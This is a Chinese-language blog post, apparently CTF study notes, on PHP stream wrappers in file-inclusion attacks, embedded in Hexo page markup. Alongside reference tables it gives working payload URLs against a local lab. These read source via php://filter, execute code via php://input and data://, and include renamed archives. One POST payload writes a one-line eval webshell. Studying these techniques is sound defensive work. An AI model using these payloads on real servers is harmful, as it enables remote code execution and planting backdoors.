@@ -1,0 +1,940 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <title>
+    PHP 伪协议 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="PHP 伪协议PHP 支持的伪协议：    file:&#x2F;&#x2F; 访问本地文件系统     http:&#x2F;&#x2F; 访问 HTTP（s）网址    ftp:&#x2F;&#x2F; 访问 FTP（s）URLs    php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams）    zlib:&#x2F;&#x2F; 压缩流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP 伪协议">
+<meta property="og:url" content="http://example.com/2024/02/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP 伪协议PHP 支持的伪协议：    file:&#x2F;&#x2F; 访问本地文件系统     http:&#x2F;&#x2F; 访问 HTTP（s）网址    ftp:&#x2F;&#x2F; 访问 FTP（s）URLs    php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams）    zlib:&#x2F;&#x2F; 压缩流">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQAZ">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQA1">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBb">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBf">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBh">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBi">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBj">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBt">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBu">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBB">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBD">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBP">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBX">
+<meta property="article:published_time" content="2024-02-23T05:20:02.000Z">
+<meta property="article:modified_time" content="2024-02-23T05:24:14.301Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://segmentfault.com/img/bVbrQAZ">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('load', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.jpg" alt="PHP 伪协议">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>PHP 伪协议</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-PHP伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/02/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date-link">
+    <time datetime="2024-02-23T05:20:02.000Z" itemprop="datePublished">2024-02-23</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h1><p>PHP 支持的伪协议：</p>
+<table>
+<thead>
+<tr>
+<th align="left">file:&#x2F;&#x2F;</th>
+<th align="left">访问本地文件系统</th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">http:&#x2F;&#x2F;</td>
+<td align="left">访问 HTTP（s）网址</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">ftp:&#x2F;&#x2F;</td>
+<td align="left">访问 FTP（s）URLs</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">php:&#x2F;&#x2F;</td>
+<td align="left">访问各个输入&#x2F;输出流（I&#x2F;O streams）</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">zlib:&#x2F;&#x2F;</td>
+<td align="left">压缩流</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">data:&#x2F;&#x2F;</td>
+<td align="left">数据（RFC 2397）</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">glob:&#x2F;&#x2F;</td>
+<td align="left">查找匹配的文件路径模式</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">phar:&#x2F;&#x2F;</td>
+<td align="left">PHP 归档</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">ssh2:&#x2F;&#x2F;</td>
+<td align="left">Secure shell 2</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">rar:&#x2F;&#x2F;</td>
+<td align="left">RAR</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">ogg:&#x2F;&#x2F;</td>
+<td align="left">音频流</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">expect:&#x2F;&#x2F;</td>
+<td align="left">处理交互的流</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://  协议"></a><code>file://</code>  协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><p><code>allow_url_fopen</code>:off&#x2F;on</p>
+</li>
+<li><p><code>allow_url_include</code> :off&#x2F;on</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在 CTF 中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照 php 语法进行解析，这是<code>include()</code>函数所决定的。</p>
+</li>
+<li><p><strong>说明</strong>：<br><code>file://</code>  文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如  <code>fopen()</code>  和  <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code>/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
+</code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>file://[文件的绝对路径和文件名]</code></p>
+<pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>[文件的相对路径和文件名]</code></p>
+<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>[http：//网络路径和文件名]</code></p>
+<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述" title="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=uBLVZAMwYqW6aAbznuAwug==.22aDE2+H08r2rOqCGRyU/kgttEcz611q0H3VbvLPSgtBgGpaowuutYtv1OOq7kA9">http://php.net/manual/zh/wrappers.file.php</a></p>
+</li>
+</ul>
+<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://  协议"></a><code>php://</code>  协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><p><code>allow_url_fopen</code>:off&#x2F;on</p>
+</li>
+<li><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要 on</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br><code>php://</code>  访问各个输入&#x2F;输出流（I&#x2F;O streams），在 CTF 中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行 php 代码</strong>。</p>
+</li>
+<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>协议</strong></th>
+<th align="left"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php:&#x2F;&#x2F;input</td>
+<td align="left">可以访问请求的原始数据的只读流，在 POST 请求中访问 POST 的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code>  的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td align="left">php:&#x2F;&#x2F;output</td>
+<td align="left">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td align="left">php:&#x2F;&#x2F;fd</td>
+<td align="left">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如  <code>php://fd/3</code>  引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td align="left">php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
+<td align="left">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是  <code>php://memory</code>  总是把数据储存在内存中，而  <code>php://temp</code>  会在内存量达到预定义的限制后（默认是  <code>2MB</code>）存入临时文件中。临时文件位置的决定和  <code>sys_get_temp_dir()</code>  的方式一致。</td>
+</tr>
+<tr>
+<td align="left">php:&#x2F;&#x2F;filter</td>
+<td align="left">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似  <code>readfile()</code>、<code>file()</code>  和  <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><code>php://filter</code>参数详解</p>
+<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>php:&#x2F;&#x2F;filter 参数</strong></th>
+<th align="left"><strong>描述</strong></th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">resource=&lt;要过滤的数据流&gt;</td>
+<td align="left">必须项。它指定了你要筛选过滤的数据流。</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">read=&lt;读链的过滤器&gt;</td>
+<td align="left">可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td align="left">*）分隔。</td>
+</tr>
+<tr>
+<td align="left">write=&lt;写链的过滤器&gt;</td>
+<td align="left">可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td align="left">）分隔。</td>
+</tr>
+<tr>
+<td align="left">&lt;; 两个链的过滤器&gt;</td>
+<td align="left">任何没有以  <em>read=</em>  或  <em>write=</em>  作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>可用的过滤器列表（4 类）</strong></p>
+<p>此处列举主要的过滤器类型，详细内容请参考：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=X3IaVPoVOaCS5Q1DJYzjtw==.mwHiIlbcaFFBAz7HPsYwX3+xYHxjtOK+xF0LkdWk0OXBIxG4laaf5AjVCb2VVsoH">https://www.php.net/manual/zh/filters.php</a></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>字符串过滤器</strong></th>
+<th align="left"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">string.rot13</td>
+<td align="left">等同于<code>str_rot13()</code>，rot13 变换</td>
+</tr>
+<tr>
+<td align="left">string.toupper</td>
+<td align="left">等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td align="left">string.tolower</td>
+<td align="left">等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td align="left">string.strip_tags</td>
+<td align="left">等同于<code>strip_tags()</code>，去除 html、PHP 语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>转换过滤器</strong></th>
+<th align="left"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">convert.base64-encode &amp; convert.base64-decode</td>
+<td align="left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64 编码解码</td>
+</tr>
+<tr>
+<td align="left">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td align="left">quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>压缩过滤器</strong></th>
+<th align="left"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">zlib.deflate &amp; zlib.inflate</td>
+<td align="left">在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip 的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td align="left">bzip2.compress &amp; bzip2.decompress</td>
+<td align="left">同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>加密过滤器</strong></th>
+<th align="left"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">mcrypt.*</td>
+<td align="left">libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td align="left">mdecrypt.*</td>
+<td align="left">libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对 php 文件需要 base64 编码）</p>
+<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>php://input + [POST DATA]</code>执行 php 代码</p>
+<pre><code>http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php phpinfo(); ?&gt;
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述" title="图片描述"></p>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code>http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述" title="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=vMfUrQA+x5DtN6lihcwURw==.1cEEKV2AbqeH90+lnOSp/9kRfQLbzrSN7h6H24BawHlAv23Rdj73zgyfesH2HyDr">https://php.net/manual/zh/wrappers.php.php</a></p>
+</li>
+</ul>
+<h2 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://  协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code>  协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><p><code>allow_url_fopen</code>:off&#x2F;on</p>
+</li>
+<li><p><code>allow_url_include</code> :off&#x2F;on</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code>  均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code>  等等。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>compress.zlib://file.gz</code></p>
+<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
+<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述" title="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=PRpuCWBJw/WNs+ekVvws0w==.idVqG6KJ/rr2BIVU/q2SNIEPVVCl+uMatjlPCky9paiOrW16LZZpNijHP1/Z5WzPx5oFBEWVIyNHvcSkusdHeA==">http://php.net/manual/zh/wrappers.compression.php</a></p>
+</li>
+</ul>
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://  协议"></a><code>data://</code>  协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><p><code>allow_url_fopen</code>:on</p>
+</li>
+<li><p><code>allow_url_include</code> :on</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行 PHP 代码。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code>data://text/plain,
+data://text/plain;base64,
+</code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>data://text/plain,</code></p>
+<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述" title="图片描述"></p>
+</li>
+<li><p><code>data://text/plain;base64,</code></p>
+<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述" title="图片描述"></p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https://  协议"></a><code>http:// &amp; https://</code>  协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><p><code>allow_url_fopen</code>:on</p>
+</li>
+<li><p><code>allow_url_include</code> :on</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：常规 URL 形式，允许通过  <code>HTTP 1.0</code>  的 GET 方法，以只读访问文件或资源。CTF 中通常用于远程包含。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code>http://example.com
+http://example.com/file.php?var1=val1&amp;var2=val2
+http://user:password@example.com
+https://example.com
+https://example.com/file.php?var1=val1&amp;var2=val2
+https://user:password@example.com
+</code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述" title="图片描述"></p>
+</li>
+</ul>
+<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://  协议"></a><code>phar://</code>  协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问 zip 格式压缩包内容，在这里只给出一个示例：</p>
+<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
+</code></pre>
+<p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述" title="图片描述"></p>
+<p>一款针对 PHP 应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="clszochk90002motve2ca682y" data-title="PHP 伪协议" class="article-share-link">分享</a>
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://d-sketon.top/img/backimg/bg1.jpg" data-sizes="auto" alt="windows 管道符" class="lazyload">
+          
+        
+        <a href="/2024/02/23/windows%E7%AE%A1%E9%81%93%E7%AC%A6/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            windows 管道符
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://d-sketon.top/img/backimg/bg1.jpg" data-sizes="auto" alt="碎碎念" class="lazyload">
+        
+      
+      <a href="/2024/02/23/%E7%A2%8E%E7%A2%8E%E5%BF%B5-1/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          碎碎念
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text">PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text">file:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-bzip2-zlib-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.</span> <span class="toc-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">data:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-https-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.5.</span> <span class="toc-text">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">phar:&#x2F;&#x2F;  协议</span></a></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
